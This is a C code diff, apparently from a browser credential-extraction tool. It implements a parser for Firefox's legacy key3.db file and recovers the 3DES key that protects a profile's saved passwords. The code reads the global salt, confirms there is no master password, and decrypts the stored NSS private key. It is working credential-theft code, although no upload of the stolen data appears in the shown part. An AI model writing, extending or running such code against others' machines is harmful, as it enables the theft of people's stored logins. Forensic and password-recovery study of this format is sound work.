@@ -237,23 +237,146 @@ static char **list_subdirs(const char *path, size_t *count) {
  *
  * Returns 0 on success, -1 on failure.
  */
+static uint32_t be32(const uint8_t *p) {
+    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
+           ((uint32_t)p[2] << 8)  | (uint32_t)p[3];
+}
+
+static uint16_t be16(const uint8_t *p) {
+    return (uint16_t)((p[0] << 8) | p[1]);
+}
+
+static int bdb_find_value(const uint8_t *data, size_t data_len,
+                          const char *key_name,
+                          uint8_t **out_val, size_t *out_len) {
+    if (data_len < 64) return -1;
+    uint32_t magic = be32(data);
+    if (magic != 0x00061561) return -1;
+    uint32_t ps = be32(data + 12);
+    if (ps < 512 || ps > 65536) return -1;
+    if (data_len < 0x3C) return -1;
+    uint32_t nb_key = be32(data + 0x38);
+    if (nb_key == 0 || nb_key > 1000) return -1;
+
+    for (uint32_t page = 1; page < 10 && (size_t)page * ps < data_len; page++) {
+        size_t pb = (size_t)page * ps;
+        if (pb + 4 > data_len) break;
+        uint32_t entries = nb_key * 2;
+        if (entries > 256) entries = 256;
+        if (pb + 2 + entries * 2 > data_len) continue;
+
+        uint16_t off[256];
+        for (uint32_t i = 0; i < entries; i++)
+            off[i] = be16(data + pb + 2 + i * 2);
+
+        for (uint32_t i = 0; i + 1 < entries; i += 2) {
+            size_t vs = pb + off[i];
+            size_t ks = pb + off[i + 1];
+            size_t end2 = (i + 2 < entries) ? pb + off[i + 2] : pb + ps;
+            if (ks >= data_len || end2 > data_len || vs >= ks) continue;
+            size_t kl = end2 - ks;
+            size_t vl = ks - vs;
+            if (kl == strlen(key_name) && memcmp(data + ks, key_name, kl) == 0) {
+                *out_val = (uint8_t *)malloc(vl);
+                if (!*out_val) return -1;
+                memcpy(*out_val, data + vs, vl);
+                *out_len = vl;
+                return 0;
+            }
+        }
+    }
+    return -1;
+}
+
+static int bdb_find_bin_key(const uint8_t *data, size_t data_len,
+                            const uint8_t *key, size_t key_len,
+                            uint8_t **out_val, size_t *out_len) {
+    if (data_len < 64) return -1;
+    uint32_t ps = be32(data + 12);
+    if (ps < 512 || ps > 65536) return -1;
+    if (data_len < 0x3C) return -1;
+    uint32_t nb_key = be32(data + 0x38);
+    if (nb_key == 0 || nb_key > 1000) return -1;
+
+    for (uint32_t page = 1; page < 10 && (size_t)page * ps < data_len; page++) {
+        size_t pb = (size_t)page * ps;
+        if (pb + 4 > data_len) break;
+        uint32_t entries = nb_key * 2;
+        if (entries > 256) entries = 256;
+        if (pb + 2 + entries * 2 > data_len) continue;
+
+        uint16_t off[256];
+        for (uint32_t i = 0; i < entries; i++)
+            off[i] = be16(data + pb + 2 + i * 2);
+
+        for (uint32_t i = 0; i + 1 < entries; i += 2) {
+            size_t vs = pb + off[i];
+            size_t ks = pb + off[i + 1];
+            size_t end2 = (i + 2 < entries) ? pb + off[i + 2] : pb + ps;
+            if (ks >= data_len || end2 > data_len || vs >= ks) continue;
+            size_t kl = end2 - ks;
+            size_t vl = ks - vs;
+            if (kl == key_len && memcmp(data + ks, key, kl) == 0) {
+                *out_val = (uint8_t *)malloc(vl);
+                if (!*out_val) return -1;
+                memcpy(*out_val, data + vs, vl);
+                *out_len = vl;
+                return 0;
+            }
+        }
+    }
+    return -1;
+}
+
 static int try_key3_db(const char *profile_path,
                         unsigned char *key_out, size_t *key_len) {
     char *key3_path = path_join(profile_path, "key3.db");
     if (!key3_path) return -1;
 
-    FILE *f = fopen(key3_path, "rb");
-    if (!f) { free(key3_path); return -1; }
-    fclose(f);
+    size_t flen = 0;
+    uint8_t *fdata = read_file(key3_path, &flen);
     free(key3_path);
+    if (!fdata) return -1;
 
-    /* key3.db uses a different schema (metadata table, 3DES instead of AES).
-     * Not yet implemented. */
-    dbg_printf("[!] key3.db decryption not implemented\n");
-    (void)key_out;
-    (void)key_len;
-    return -1;
+    uint8_t *gs = NULL; size_t gsl = 0;
+    if (bdb_find_value(fdata, flen, "global-salt", &gs, &gsl) != 0) {
+        free(fdata); return -1;
+    }
+
+    uint8_t *pc = NULL; size_t pcl = 0;
+    if (bdb_find_value(fdata, flen, "password-check", &pc, &pcl) != 0) {
+        free(gs); free(fdata); return -1;
+    }
+
+    unsigned char pdec[128]; size_t pdecl = 0;
+    int rc = fx_decrypt_nss_pbe(gs, gsl, (const unsigned char *)"", 0,
+                                 pc, pcl, pdec, sizeof(pdec), &pdecl);
+    free(pc);
+    if (rc != 0 || pdecl < 14 || memcmp(pdec, "password-check", 14) != 0) {
+        free(gs); free(fdata); return -1;
+    }
+
+    uint8_t nss_key[16];
+    nss_key[0] = 0xf8;
+    memset(nss_key + 1, 0, 14);
+    nss_key[15] = 0x01;
+
+    uint8_t *nb = NULL; size_t nbl = 0;
+    if (bdb_find_bin_key(fdata, flen, nss_key, 16, &nb, &nbl) != 0) {
+        free(gs); free(fdata); return -1;
+    }
+
+    unsigned char ndec[512]; size_t ndecl = 0;
+    rc = fx_decrypt_nss_pbe(gs, gsl, (const unsigned char *)"", 0,
+                             nb, nbl, ndec, sizeof(ndec), &ndecl);
+    free(nb); free(gs); free(fdata);
+    if (rc != 0 || ndecl < 24) return -1;
+
+    memcpy(key_out, ndec + ndecl - 24, 24);
+    *key_len = 24;
+    return 0;
 }
+
 
 static int firefox_extract_key(const char *profile_path,
                                unsigned char *nss_key_out, size_t *nss_key_len) {
